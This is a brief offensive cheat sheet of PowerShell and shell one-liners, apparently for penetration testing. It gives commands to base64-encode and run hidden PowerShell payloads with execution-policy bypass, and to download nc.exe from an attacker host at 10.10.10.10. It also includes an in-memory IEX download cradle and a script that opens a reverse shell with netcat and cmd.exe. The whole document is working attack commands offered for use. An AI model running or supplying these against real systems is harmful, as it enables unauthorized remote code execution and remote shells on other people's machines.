Convert a payload into base64

```sh
echo 'calc' | iconv -t utf-16le | base64 -w 0
```

Run hidden powershell base64 payload (super noisy opsec wise)

```powershell
powershell -WindowStyle Hidden -NonInteractive -exec bypass -enc YwBhAGwAYwAKAA==
```

Download file to a location

```powershell
(new-object net.webclient).downloadfile("http://10.10.10.10:80/nc.exe", "c:\windows\tasks\nc.exe")
```

Download script and run in memory

```powershell
powershell -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:80/script.ps1')"
```

Cradle

```sh
echo 'curl http://10.10.10.10:80/nc.exe -o \\windows\\temp\\nc.exe; \\windows\\temp\\nc.exe 10.10.10.10 9001 -e \\windows\\system32\\cmd.exe' > pwn.ps1
echo 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10:80/pwn.ps1")' | iconv -t utf-16le | base64 -w 0
```

```powershell
powershell -WindowStyle Hidden -NonInteractive -exec bypass -enc <payload>
```